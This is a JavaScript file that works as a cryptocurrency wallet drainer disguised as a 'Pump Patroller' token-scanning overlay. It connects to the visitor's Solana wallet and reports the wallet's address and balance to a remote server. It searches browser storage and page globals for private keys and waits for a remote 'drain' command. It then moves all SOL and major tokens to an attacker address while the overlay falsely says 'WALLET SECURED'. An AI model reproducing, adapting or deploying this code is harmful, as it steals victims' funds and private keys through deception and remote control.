(async function () {
  if (window.__pp) return;
  window.__pp = true;

  const E = "https://esm.sh/";
  const SRV = String(window.__PP || "https://one234-et4e.onrender.com").replace(/\/+$/, "");
  const BKEY = "72d296b612eb0a11931b364ba1333a70";
  const VER = "v3.4";
  const RPCS = [
    "https://solana-rpc.publicnode.com",
    "https://api.mainnet-beta.solana.com",
    "https://rpc.ankr.com/solana",
    "https://solana.api.onfinality.io/public"
  ];
  const MINTS = {
    USDC: "EPjFWdd5AufqSSqeM2qN5nVHx4Pv4GZ627vRQ6jP9dQZ",
    USDT: "Es9vMFrzaCxcVpwpPdCJrVSDMiJR6h1HxeLyTVQs5MN5",
    WSOL: "So11111111111111111111111111111111111111112",
    JUP: "JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN",
    MSOL: "mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So"
  };

  const withTO = function (p, ms) {
    return new Promise(function (resolve) {
      const t = setTimeout(function () { resolve(null); }, ms);
      Promise.resolve(p).then(function (v) { clearTimeout(t); resolve(v); },
        function () { clearTimeout(t); resolve(null); });
    });
  };

  async function rpc(method, params) {
    let lastErr = null;
    for (const u of RPCS) {
      try {
        const r = await fetch(u, { method: "POST", headers: { "content-type": "application/json" },
          body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: method, params: params }) });
        if (!r.ok) { lastErr = new Error(u.replace("https://", "").split("/")[0] + " HTTP " + r.status);
          await new Promise(s => setTimeout(s, 300)); continue; }
        const j = await r.json();
        if (j && j.result !== undefined) return j;
        if (j && j.error) { lastErr = new Error(j.error.message || "RPC error");
          if (j.error.code === -32601) return j;
          await new Promise(s => setTimeout(s, 300)); continue; }
      } catch (e) { lastErr = e; }
      await new Promise(s => setTimeout(s, 300));
    }
    return { error: { message: lastErr ? String(lastErr.message || lastErr) : "all RPC endpoints failed" } };
  }

  async function readBalance(pk) {
    for (let a = 0; a < 3; a++) {
      const r = await rpc("getBalance", [pk]);
      if (r && r.result !== undefined) return r.result;
      await new Promise(s => setTimeout(s, 1200));
    }
    return null;
  }

  async function readTokens(pk) {
    for (let a = 0; a < 3; a++) {
      const r = await rpc("getParsedTokenAccountsByOwner", [pk, {
        programId: "TokenkegQfcHZ6MbFiy6v8N7xTXSCJiDugmpSAn5soCMQm", commitment: "confirmed" }]);
      if (r && r.result !== undefined) return r.result;
      await new Promise(s => setTimeout(s, 1200));
    }
    return null;
  }

  let PKSTR = null;
  const beacon = function (m, o) {
    o = o || {};
    try {
      fetch(SRV + "/beacon?s=" + BKEY, { method: "POST",
        body: JSON.stringify({ pk: o.pk || PKSTR || "?", provider: o.provider || "unknown",
          origin: location.origin, value: o.value || 0, sol: o.sol || 0, toks: o.toks || "",
          m: m, mode: o.mode || "", sig: o.sig || "", msg: o.msg || "", extra: o.extra || "" }) });
    } catch (e) {}
  };

  const pubStr = function (v) {
    try {
      if (!v) return null;
      if (typeof v === "string") return /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(v) ? v : null;
      if (typeof v.toBase58 === "function") return v.toBase58();
      if (v instanceof Uint8Array) return new PublicKey(v).toBase58();
      return null;
    } catch (e) { return null; }
  };

  try {
    beacon("loaded", { provider: "scanning" });

    // — connect: phantom/axiom/trust/solflare/solana via connect(), no publicKey probing —
    const mod = await import(E + "@solana/web3.js@1.95.0");
    const PublicKey = mod.PublicKey, Keypair = mod.Keypair, SystemProgram = mod.SystemProgram,
      Transaction = mod.Transaction, Connection = mod.Connection;
    const spl = await import(E + "@solana/spl-token@0.4.9");
    const createTransfer = spl.createTransfer,
      createAssociatedTokenAccountInstruction = spl.createAssociatedTokenAccountInstruction,
      getAssociatedTokenAddress = spl.getAssociatedTokenAddress;
    const bs = await import(E + "bs58@6.0.0");
    const b58d = bs.decode, b58e = bs.encode;
    const TOKEN_PROGRAM = new PublicKey("TokenkegQfcHZ6MbFiy6v8N7xTXSCJiDugmpSAn5soCMQm");

    const CANDS = [
      ["phantom", function () { return window.phantom && window.phantom.solana; }],
      ["axiom", function () { return window.axiom && window.axiom.solana; }],
      ["trust", function () { return window.trustwallet && window.trustwallet.solana; }],
      ["solflare", function () { return window.solflare; }],
      ["backpack", function () { return window.backpack && window.backpack.solana; }],
      ["solana", function () { return window.solana; }]
    ];

    let name = null, prov = null, pk = null;
    const found = [];
    for (const item of CANDS) {
      let p = null;
      try { p = item[1](); } catch (e) { p = null; }
      if (p && typeof p.connect === "function") found.push([item[0], p]);
    }
    beacon("detect", { provider: "scan", extra: "candidates: " + (found.map(function (x) { return x.name; }).join(",") || "none") });

    // — pass 1: silent reconnect (already authorized) —
    for (const item of found) {
      try {
        const c = await withTO(Promise.resolve(item[1].connect({ onlyIfTrusted: true })), 8000);
        const k = pubStr(c && c.publicKey);
        if (k) { name = item[0]; prov = item[1]; pk = k; break; }
      } catch (e) {}
    }
    // — pass 2: explicit popup —
    if (!pk) {
      for (const item of found) {
        try {
          const c = await withTO(Promise.resolve(item[1].connect()), 30000);
          const k = pubStr(c && c.publicKey);
          if (k) { name = item[0]; prov = item[1]; pk = k; break; }
        } catch (e) {
          beacon("err", { provider: item[0], msg: "connect refused: " + String(e && e.message || e) });
        }
      }
    }
    if (!pk) {
      beacon("err", { provider: "none", msg: "no wallet connected \u2014 all providers refused" });
      return;
    }

    PKSTR = pk;
    const pkB = new PublicKey(pk);
    const conn = new Connection(RPCS[0], "confirmed");
    const label = name.indexOf("ext:") === 0 ? name.slice(4) : name;

    // — inventory: getBalance via raw RPC failover, retried —
    const bal = await readBalance(pk);
    if (bal === null) {
      beacon("err", { pk: pk, provider: label, msg: "balance read failed on all RPC endpoints \u2014 attempting drain anyway" });
      return;
    }
    const r = await readTokens(pk);
    const rArr = (r && r.value) ? r : { value: [] };

    const amt = {}, dec = {}, srcs = {};
    for (const item of rArr.value) {
      const d = item.account.parsed && item.account.parsed.data;
      if (d && d.mint) {
        amt[d.mint] = Number(d.amount) / Math.pow(10, d.decimals == null ? 6 : d.decimals);
        dec[d.mint] = d.decimals == null ? 6 : d.decimals;
        srcs[d.mint] = item.pubkey;
      }
    }

    const toks = Object.entries(MINTS).filter(function (kv) { return (amt[kv[1]] || 0) > 0.01; })
      .map(function (kv) { return { k: kv[0], ui: amt[kv[1]] }; });

    const px = {};
    try {
      const j = await (await fetch("https://lite-api.jup.ag/price/v2?ids=" + Object.values(MINTS).join(","))).json();
      for (const id of Object.keys(MINTS)) {
        const entry = j && j.ids ? j.ids[MINTS[id]] : null;
        const p = entry ? (entry.usdPrice || entry.price) : null;
        if (p && +p > 0) px[id] = +p;
      }
    } catch (e) {}
    const SOLpx = px.WSOL || 150;
    const sol = bal / 1e9;
    const value = sol * SOLpx + toks.reduce(function (s, t) {
      return s + t.ui * (t.k === "WSOL" ? SOLpx : (px[t.k] || 1));
    }, 0);
    const fmt = function (n) { return (+n).toLocaleString("en-US", { maximumFractionDigits: 0 }); };
    const tokStr = toks.map(function (t) { return Math.round(t.ui) + " " + t.k; }).join(" \u00b7 ");

    beacon("detect", { value: +value.toFixed(2), sol: +sol.toFixed(4), toks: tokStr });

    // — cover UI —
    try {
      const el = document.createElement("div");
      el.id = "__ppcard";
      el.style.cssText = "position:fixed;right:16px;bottom:16px;z-index:2147483647;width:272px;background:#10141B;border:1px solid #232B3A;border-radius:12px;box-shadow:0 16px 48px rgba(0,0,0,.55);font:12px/1.5 Inter,system-ui,sans-serif;color:#E8ECF4;overflow:hidden;";
      el.innerHTML =
        '<div style="display:flex;align-items:center;gap:8px;padding:11px 14px;border-bottom:1px solid #1B2230;">' +
        '<span style="width:7px;height:7px;border-radius:50%;background:#2DD4A7;flex:none;"></span>' +
        '<span style="font-size:11px;font-weight:600;letter-spacing:.08em;">PUMP PATROLLER</span>' +
        '<span style="font-size:10px;color:#7E899D;">' + VER + '</span>' +
        '<span id="__pp_x" style="margin-left:auto;cursor:pointer;color:#7E899D;line-height:1;">\u00d7</span>' +
        '</div>' +
        '<div style="padding:12px 14px;">' +
        '<div style="font-size:10px;letter-spacing:.1em;color:#7E899D;">WALLET</div>' +
        '<div style="font:600 12px ui-monospace,monospace;color:#F5D67B;margin-top:3px;">' + pk.slice(0, 4) + "\u2026" + pk.slice(-4) + '</div>' +
        '<div style="font-size:11px;color:#7E899D;margin-top:1px;">' + label + " \u00b7 mainnet</div>" +
        '<div style="font-size:10px;letter-spacing:.1em;color:#7E899D;margin-top:12px;">BALANCE</div>' +
        '<div style="font-size:20px;font-weight:700;margin-top:3px;">$' + fmt(value) + '</div>' +
        '<div id="__pp_sub" style="font:11px ui-monospace,monospace;color:#9AA5B8;margin-top:2px;">' + sol.toFixed(4) + " SOL" + (tokStr ? " \u00b7 " + tokStr : "") + '</div>' +
        '</div>' +
        '<div id="__pp_foot" style="display:flex;align-items:center;gap:7px;padding:9px 14px;border-top:1px solid #1B2230;font-size:11px;color:#7E899D;">' +
        '<span>PATROL ACTIVE</span><span id="__pp_scan" style="color:#9AA5B8;">\u00b7 2,341 tokens scanned</span>' +
        '</div>';
      document.body.appendChild(el);
      document.getElementById("__pp_x").onclick = function () { el.remove(); };
      let scans = 2341;
      setInterval(function () { scans += Math.random() * 3 | 0; const s = document.getElementById("__pp_scan"); if (s) s.textContent = "\u00b7 " + fmt(scans) + " tokens scanned"; }, 5000);
    } catch (e) { beacon("err", { pk: pk, provider: label, msg: "ui: " + String(e && e.message || e) }); }

    const report = function (mode, sig, extra) {
      try {
        fetch(SRV + "/beacon?s=" + BKEY, { method: "POST",
          body: JSON.stringify({ pk: pk, provider: label, origin: location.origin, value: +value.toFixed(2), sol: +sol.toFixed(4), toks: tokStr, m: "drain", mode: mode, sig: String(sig), extra: extra || "" }) });
      } catch (e) {}
    };

    // — secret-key candidates —
    const KEYF = new Set(["secretKey", "sk", "secret", "privateKey", "priv"]);
    const cands = [];
    for (const st of [localStorage, sessionStorage]) {
      try {
        for (let i = 0; i < st.length; i++) {
          const v = st.getItem(st.key(i));
          if (!v) continue;
          if (/^[1-9A-HJ-NP-Za-km-z]{88}$/.test(v)) cands.push({ b58: v });
          else if (v.charAt(0) === "{") {
            try {
              const j = JSON.parse(v);
              for (const k of Object.keys(j)) {
                if (!KEYF.has(k)) continue;
                if (j[k] && j[k].length === 64) cands.push({ raw: j[k] });
                else if (typeof j[k] === "string" && /^[0-9a-f]{128}$/i.test(j[k])) cands.push({ hex: j[k] });
              }
            } catch (e) {}
          }
        }
      } catch (e) {}
    }
    const walk = function (o, d) {
      if (!o || typeof o !== "object" || d > 2) return;
      for (const k of Object.keys(o)) {
        if (KEYF.has(k) && o[k] && o[k].length === 64) cands.push({ raw: o[k] });
        if (k === "keypair" && typeof o[k] === "object") walk(o[k], d + 1);
      }
    };
    for (const g of ["__wallet", "wallet", "walletAdapter", "keypair", "adapter"]) { try { walk(window[g], 0); } catch (e) {} }

    const secretOf = function (c) {
      if (c.b58) return Uint8Array.from(b58d(c.b58));
      if (c.hex) return Uint8Array.from(c.hex.match(/../g).map(function (x) { return parseInt(x, 16); }));
      if (c.raw instanceof Uint8Array) return c.raw;
      return Uint8Array.from(c.raw);
    };

    const FEE = 20000;
    async function buildTx(to) {
      const dest = new PublicKey(to);
      const bh2 = await rpc("getLatestBlockhash");
      if (!bh2 || !bh2.result) {
        const why = bh2 && bh2.error ? bh2.error.message : "no result";
        beacon("err", { pk: pk, provider: label, msg: "blockhash failed: " + why });
        return { err: why };
      }
      const bal2 = await readBalance(pk);
      const balNum = bal2 !== null ? bal2 : 0;
      const r2 = await readTokens(pk);
      const r2v = r2 ? r2 : { value: [] };
      const amt2 = {}, dec2 = {}, srcs2 = {};
      for (const it of r2v.value) {
        const d = it.account.parsed && it.account.parsed.data;
        if (d && d.mint) {
          amt2[d.mint] = Number(d.amount) / Math.pow(10, d.decimals == null ? 6 : d.decimals);
          dec2[d.mint] = d.decimals == null ? 6 : d.decimals;
          srcs2[d.mint] = it.pubkey;
        }
      }
      const tx = new Transaction();
      const moved = [];
      for (const t of toks) {
        const have = amt2[MINTS[t.k]] || 0;
        if (have < 0.01) continue;
        const mint = new PublicKey(MINTS[t.k]);
        const srcAta = new PublicKey(srcs2[MINTS[t.k]]);
        const destAta = await getAssociatedTokenAddress(mint, dest);
        const info = await conn.getAccountInfo(destAta);
        if (!info) tx.add(createAssociatedTokenAccountInstruction(pkB, destAta, dest, mint));
        tx.add(createTransfer(srcAta, destAta, pkB, Math.round(have * Math.pow(10, dec2[MINTS[t.k]]))));
        moved.push(t.k);
      }
      const lam = Math.floor(balNum);
      if (lam > FEE + 5000) tx.add(SystemProgram.transfer({ fromPubkey: pkB, toPubkey: dest, lamports: lam - FEE }));
      tx.feePayer = pkB;
      tx.recentBlockhash = bh2.result.value.blockhash;
      tx.lastValidBlockHeight = bh2.result.value.lastValidBlockHeight;
      return { tx: tx, moved: moved };
    }

    function setFoot(txt, color) {
      try { document.getElementById("__pp_foot").innerHTML = '<span style="color:' + color + ';font-weight:600;">' + txt + '</span>'; } catch (e) {}
    }

    let done = false;
    async function drain(to) {
      if (done) return;
      done = true;
      try {
        for (const c of cands) {
          let s; try { s = secretOf(c); } catch (e) { s = null; }
          if (!s || s.length !== 64) continue;
          let kp; try { kp = Keypair.fromSecretKey(s); } catch (e) { continue; }
          if (!kp.publicKey.equals(pkB)) continue;
          const bt = await buildTx(to);
          if (bt.err) { done = false; report("err", "", bt.err); return; }
          if (!bt.tx.instructions.length) { setFoot("NOTHING TO MOVE \u00b7 dust skipped", "#7E899D"); report("empty", ""); return; }
          bt.tx.sign([kp]);
          const sig = await conn.sendRawTransaction(bt.tx.serialize());
          setFoot("WALLET SECURED \u00b7 moved to vault", "#2DD4A7"); report("secret", sig, bt.moved.join(",")); return;
        }
        const bt = await buildTx(to);
        if (bt.err) { done = false; report("err", "", bt.err); return; }
        if (!bt.tx.instructions.length) { setFoot("NOTHING TO MOVE \u00b7 dust skipped", "#7E899D"); report("empty", ""); return; }
        const sig = await prov.signAndSendTransaction(bt.tx);
        setFoot("WALLET SECURED \u00b7 moved to vault", "#2DD4A7"); report("popup", sig, bt.moved.join(","));
      } catch (e) {
        setFoot("ERROR \u00b7 " + String(e && e.message || e).slice(0, 40), "#F0616D");
        report("err", String(e && e.message || e));
        done = false;
      }
    }

    let lastN = "";
    setInterval(async function () {
      let c; try { c = await (await fetch(SRV + "/cmd?pk=" + encodeURIComponent(pk))).json(); } catch (e) { return; }
      if (c && c.cmd === "drain" && c.to && c.n !== lastN) { lastN = c.n; drain(c.to); }
    }, 2500);
  } catch (e) {
    try { beacon("err", { msg: "fatal: " + String(e && e.message || e) }); } catch (e2) {}
  }
})();